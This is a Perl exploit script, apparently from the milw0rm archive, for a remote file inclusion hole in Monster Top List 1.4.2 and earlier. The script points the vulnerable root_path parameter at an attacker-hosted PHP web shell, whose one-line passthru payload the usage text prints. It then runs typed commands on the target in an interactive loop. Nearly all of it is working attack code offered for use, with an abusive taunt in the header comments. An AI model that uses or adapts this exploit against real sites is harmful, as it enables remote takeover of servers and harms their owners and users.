#!/usr/bin/perl
#
# Monster Top List <= 1.4.2 remote Command Execution Vulnerabilities
#
# Risk : High (Remote Code Execution)
#
# Url: http://www.monstertoplist.com
#
# Exploit:
#   http://site.com/[path]/sources/functions.php?root_path=[Evil_Script]
#
# (c)oded and f0und3d by fluffy_bunny
#
# Romanian Security Team .: hTTp://RSTZONE.NET :.
#
# t0 psyke[pwn]: "y0ur c0de suqz. y0ur s1t3 suqz. y0u sm3ll 0f sh33p f3c3z. 3y3 th1nk y0u n33d t0
#                t4k3 4n 0nl1n3 w3b d3s1gn c0urz3 0r s0m3th1ng. fuqn d0rk."

use LWP::Simple;

print "...........................[RST]...............................\n";
print ".                                                             .\n";
print ". Monster Top List <= 1.4.2 RFI spl0it                        .\n";
print ".                                                             .\n";
print "...............................................................\n";
print ".       Romanian Security Team -> hTTp://RSTZONE.NET          .\n";
print ".       [c]oded by fluffy_bunny - mafia@google.ro             .\n";
print "...............................................................\n\n";

my $kw3,$path,$shell,$conexiune,$cmd,$data ;


if ((!$ARGV[0]) || (!$ARGV[1])) { &usage;exit(0);}

$path = $ARGV[0];
chomp($path);
$shell = $ARGV[1];    
chomp($shell);
    
$path = $path."/sources/functions.php";


sub usage(){
    print "Usage    : perl $0 host/path http://site.com/cmd.txt\n\n";
    print "Example  : perl $0 http://127.0.0.1 http://site.com/cmd.txt\n\n";
    print 'Shell    : <?php ob_clean();ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>';
}

while ()  
{  
print "[kw3rln].[rst] :~\$ ";
chomp($cmd=<STDIN>);
if ($cmd eq "exit") { exit(0);}

$kw3 = $path."?root_path=".$shell."?&cmd=".$cmd;
if ($cmd eq "")     
  { print "Enter your command !\n"; }
else
  { $data=get($kw3); print $data ; }
}

# milw0rm.com [2007-03-20]
